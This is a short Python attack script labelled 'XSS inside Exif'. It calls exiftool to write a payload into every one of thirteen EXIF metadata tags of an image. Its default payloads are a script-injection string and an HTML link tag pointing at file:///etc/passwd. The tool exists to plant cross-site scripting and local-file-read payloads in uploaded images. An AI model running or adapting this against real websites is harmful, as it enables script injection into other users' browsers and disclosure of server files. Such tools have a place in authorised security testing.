#!/usr/bin/python3
import sys
import argparse
import subprocess
 
exif_tags = [
   "ImageDescription",
   "Make",
   "Model",
   "Software",
   "Artist",
   "Copyright",
   "XPTitle",
   "XPComment",
   "XPAuthor",
   "XPSubject",
   "Location",
   "Description",
   "Author"
]
 
parser = argparse.ArgumentParser(description='XSS inside Exif')
parser.add_argument('-i', '--input', type=str, help="Input file")
parser.add_argument('-p', '--payload', type=str, help="Payload (optional)")
argv = parser.parse_args()

if not argv.input:
    print("Use --help")
if not argv.payload:
    argv.payload = '"><script>alert(1)</script><!--'
    argv.payload = '<link rel="attachment" href="file:///etc/passwd"></link>'
try:
    for exif in exif_tags:
        each_tag = "-{}={}".format(exif, argv.payload)
        print(each_tag)
        subprocess.call(["exiftool", each_tag, argv.input])
    subprocess.call(["exiftool", argv.input])
except Exception as E:
    print(E)
